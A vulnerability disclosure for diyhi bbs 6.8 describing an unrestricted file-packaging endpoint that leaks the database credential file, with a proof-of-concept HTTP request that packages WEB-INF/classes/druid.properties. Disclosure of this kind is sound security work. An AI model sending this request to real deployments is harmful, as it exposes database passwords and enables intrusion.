# Vendor

diyhi

# Product

bbs

# version

6.8

# Download 

https://gitee.com/diyhi/bbs
https://www.diyhi.com/
https://github.com/diyhi/bbs

# Vulnerability

diyhi bbs latest version 6.8 Sensitive information leakage vulnerability

# Description

In diyhi bbs latest version 6.8 (src/main/java/cms/web/action/filePackage/FilePackageManageAction.java) , users can package any file into a compressed package and download it, resulting in compressing and downloading the database account password configuration file, revealing sensitive information.

# Analysis
This document describes a Sensitive information leakage vulnerability found in the [bbs](https://gitee.com/diyhi/bbs) repository.

Discovery Date: 2025-06-18

Audits find that src/main/java/cms/web/action/filePackage/FilePackageManageAction.java

There is no whitelist of compressed files, resulting in all files being compressed and downloaded, such as configuration files containing database account password:

<img width="1231" height="921" alt="image" src="https://github.com/user-attachments/assets/1f91b351-4da9-4f2f-aeba-424953a78d64" />

The vulnerability is reproduced as follows:

<img width="927" height="473" alt="image" src="https://github.com/user-attachments/assets/89085f71-979e-4272-9622-3f479af2d3ff" />

Then we download the compressed package:

<img width="1920" height="626" alt="image" src="https://github.com/user-attachments/assets/264a6cf5-3825-4b7e-88a7-c86fd59a48fa" />

Decompress the compressed packet to access this sensitive information:

<img width="780" height="561" alt="image" src="https://github.com/user-attachments/assets/82274082-680c-4ef7-80ce-20a6a82818c1" />

# POC
```
POST /control/filePackage/manage?method=package HTTP/1.1
Host: 192.168.43.92:8231
Content-Length: 170
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Authorization: Bearer CGxbjJilafzmoqWzJj23ys2AMpk
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHAqbaOmM37x1G1WF
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryHAqbaOmM37x1G1WF
Content-Disposition: form-data; name="idGroup"

WEB-INF/classes/druid.properties
------WebKitFormBoundaryHAqbaOmM37x1G1WF--
```






